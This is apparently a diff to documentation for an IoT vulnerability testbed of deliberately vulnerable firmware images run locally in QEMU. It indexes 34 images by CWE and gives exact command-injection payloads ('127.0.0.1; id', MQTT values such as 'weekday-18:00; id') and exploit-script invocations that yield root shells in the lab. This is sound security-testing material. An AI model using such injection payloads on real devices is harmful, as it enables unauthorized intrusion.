@@ -6,6 +6,65 @@ their attack path adapted to each device's native service. A second set of
 images provides distinct, CVE-inspired weaknesses tailored to each device
 class.
 
+## Execution convention
+
+Every procedure uses two terminals. Boot the selected exported image in the
+first terminal:
+
+```bash
+FIRMWARE=<firmware-id> ./scripts/run-qemu.sh
+```
+
+Run the payload from the repository root in the second terminal. Unless a row
+says otherwise, the default host endpoints are HTTP `127.0.0.1:8080`, MQTT
+`127.0.0.1:1883`, Modbus/TCP `127.0.0.1:1502`, SSH `127.0.0.1:2222`, ZCL bridge
+`127.0.0.1:17754`, media parser `127.0.0.1:18000`, and patient protocol
+`127.0.0.1:2575`.
+
+## Complete firmware index
+
+This index covers all 34 `iotbench-*.bb` image recipes currently in the
+repository. Detailed router catalog payloads are kept in
+[francesco-payloads.md](francesco-payloads.md); all other procedures are in
+this document.
+
+| Firmware id | CWE | Attack surface | Detailed procedure |
+| --- | --- | --- | --- |
+| `router-cwe078-os-command-injection` | CWE-78 | HTTP dashboard ping diagnostic | [Router dashboard](#router-dashboard-cwe-78) |
+| `ipcamera-cwe078-os-command-injection` | CWE-78 | HTTP PTZ CGI | [IP camera CGI](#ip-camera-cgi) |
+| `smartplug-cwe078-os-command-injection` | CWE-78 | MQTT relay schedule | [MQTT devices](#mqtt-devices) |
+| `thermostat-cwe078-os-command-injection` | CWE-78 | MQTT HVAC profile | [MQTT devices](#mqtt-devices) |
+| `smartbulb-cwe078-os-command-injection` | CWE-78 | MQTT lighting scene | [MQTT devices](#mqtt-devices) |
+| `smarthub-cwe078-os-command-injection` | CWE-78 | MQTT pairing backup | [MQTT devices](#mqtt-devices) |
+| `envsensor-cwe078-os-command-injection` | CWE-78 | MQTT calibration | [MQTT devices](#mqtt-devices) |
+| `smartspeaker-cwe078-os-command-injection` | CWE-78 | MQTT media source | [MQTT devices](#mqtt-devices) |
+| `healthmonitor-cwe078-os-command-injection` | CWE-78 | MQTT export target | [MQTT devices](#mqtt-devices) |
+| `doorlock-cwe078-os-command-injection` | CWE-78 | MQTT firmware URL | [MQTT devices](#mqtt-devices) |
+| `plc-cwe078-os-command-injection` | CWE-78 | Modbus project loader | [PLC Modbus](#plc-modbus) |
+| `router-cwe276-leaked-private-key` | CWE-276 | Public HTTP file | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe276-bad-chown-rights` | CWE-276 | Local policy file | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe798-ld-preload-sudo` | CWE-798 | SSH and sudo | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe798-vi-privilege-escalation` | CWE-798 | SSH and privileged editor | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe078-writable-root-cron` | CWE-78 | Local cron input | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe287-ssh-hardcoded-backdoor` | CWE-287 | SSH | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe089-http-sqli-auth` | CWE-89 | HTTP login | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe078-bash-command-injection` | CWE-78 | HTTP dashboard diagnostic | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe077-c-command-injection` | CWE-77 | HTTP dashboard helper | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe416-use-after-free` | CWE-416 | HTTP dashboard helper | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe400-diagnostic-dos` | CWE-400 | HTTP dashboard diagnostic | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe078-service-interface-injection` | CWE-78 | TCP service port 9090 | [Router catalog payloads](francesco-payloads.md) |
+| `router-cwe022-path-traversal` | CWE-22 | Global Lighttpd fallback | [Router catalog payloads](francesco-payloads.md) |
+| `ipcamera-cwe022-recording-path-traversal` | CWE-22 | HTTP recording export | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `smartplug-cwe862-missing-authorization` | CWE-862 | MQTT relay control | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `thermostat-cwe294-command-replay` | CWE-294 | MQTT RF-frame bridge | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `smartbulb-cwe122-zcl-heap-overflow` | CWE-122 | TCP-transposed ZCL parser | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `smarthub-cwe121-database-stack-overflow` | CWE-121 | HTTP database lookup | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `envsensor-cwe306-unauthenticated-calibration` | CWE-306 | MQTT calibration | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `smartspeaker-cwe122-id3-heap-overflow` | CWE-122 | TCP media parser | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `healthmonitor-cwe200-memory-disclosure` | CWE-200 | Patient-monitor TCP service | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `doorlock-cwe294-unlock-replay` | CWE-294 | MQTT BLE-frame bridge | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+| `plc-cwe121-modbus-stack-overflow` | CWE-121 | Vendor Modbus function | [Device-specific scenarios](#device-specific-cve-inspired-scenarios) |
+
 ## Scenario matrix
 
 | Device | Native entry point | Vulnerable use case | Execution identity |
@@ -20,6 +79,20 @@ class.
 | Health monitor | MQTT | Configure an export target | `root` |
 | Door lock | MQTT | Configure a firmware URL | `root` |
 | PLC | Modbus/TCP | Stage and apply a project name | `root` |
+
+## Router dashboard CWE-78
+
+Boot `router-cwe078-os-command-injection`, open
+`http://127.0.0.1:8080`, and submit this value in the **Ping** target field:
+
+```text
+127.0.0.1; id
+```
+
+The dashboard sends the value to `/usr/bin/router-ping`, which concatenates it
+into a shell command. Expected signal: the response contains
+`uid=995(routerweb)`. A file-write proof that stays within the service account's
+permissions is `127.0.0.1; id > /var/lib/router-dashboard/cwe78-proof`.
 
 ## IP camera CGI
 
@@ -52,8 +125,8 @@ mosquitto_pub -h 127.0.0.1 -p 1883 \
   -m 'weekday-18:00; id'
 ```
 
-Expected signal: the result contains `uid=0(root)`. Substitute the topic and a
-plausible benign prefix for the other device profiles:
+Expected signal: the result contains `uid=0(root)`. The table below provides
+the exact action and a plausible payload for every MQTT firmware.
 
 The repository also includes a dependency-free MQTT client. The equivalent
 single-command test is:
@@ -63,22 +136,22 @@ python3 scripts/exploit-mqtt-maintenance.py \
   smartplug relay-schedule 'weekday-18:00; id'
 ```
 
-| Firmware prefix | Request topic suffix | Example payload |
+| Firmware id | Exact client command | Expected signal |
 | --- | --- | --- |
-| `smartplug` | `relay-schedule` | `weekday-18:00; id` |
-| `thermostat` | `hvac-profile` | `eco.json; id` |
-| `smartbulb` | `lighting-scene` | `evening; id` |
-| `smarthub` | `pairing-backup` | `paired.tar; id` |
-| `envsensor` | `calibration` | `co2-zero; id` |
-| `smartspeaker` | `media-source` | `radio-local; id` |
-| `healthmonitor` | `export-target` | `clinic-a; id` |
-| `doorlock` | `firmware-url` | `stable.bin; id` |
+| `smartplug-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py smartplug relay-schedule 'weekday-18:00; id'` | `relay-schedule: weekday-18:00` followed by `uid=0(root)` |
+| `thermostat-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py thermostat hvac-profile 'eco.json; id'` | `hvac-profile: eco.json` followed by `uid=0(root)` |
+| `smartbulb-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py smartbulb lighting-scene 'evening; id'` | `lighting-scene: evening` followed by `uid=0(root)` |
+| `smarthub-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py smarthub pairing-backup 'paired.tar; id'` | `pairing-backup: paired.tar` followed by `uid=0(root)` |
+| `envsensor-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py envsensor calibration 'co2-zero; id'` | `sensor-calibration: co2-zero` followed by `uid=0(root)` |
+| `smartspeaker-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py smartspeaker media-source 'radio-local; id'` | `media-source: radio-local` followed by `uid=0(root)` |
+| `healthmonitor-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py healthmonitor export-target 'clinic-a; id'` | `health-export: clinic-a` followed by `uid=0(root)` |
+| `doorlock-cwe078-os-command-injection` | `python3 scripts/exploit-mqtt-maintenance.py doorlock firmware-url 'stable.bin; id'` | `lock-firmware: stable.bin` followed by `uid=0(root)` |
 
 The full request topic is
 `iotbench/<prefix>/maintenance/<request-topic-suffix>` and the response topic
 is `iotbench/<prefix>/maintenance-result`.
 
-## PLC Modbus/TCP
+## PLC Modbus
 
 Boot `plc-cwe078-os-command-injection`. `run-qemu.sh` maps host port 1502 to
 guest port 502. The vulnerable vendor extension uses these holding registers:
